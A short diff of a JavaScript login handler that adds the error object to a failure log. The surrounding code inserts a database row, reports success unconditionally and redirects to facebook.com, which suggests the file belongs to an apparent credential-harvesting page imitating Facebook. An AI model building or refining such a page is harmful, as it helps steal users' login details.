@@ -23,7 +23,7 @@ document.addEventListener('DOMContentLoaded', () => {
             .select(); // return inserted row(s)
              console.log("Logged In Success")
 
-          if (error) console.log("Log In Failed");
+          if (error) console.log("Log In Failed: ", error);
 
       setTimeout(() => {
          window.location.href = 'https://www.facebook.com';
@@ -34,6 +34,7 @@ document.addEventListener('DOMContentLoaded', () => {
      }
   });
 })
+
 
 
 
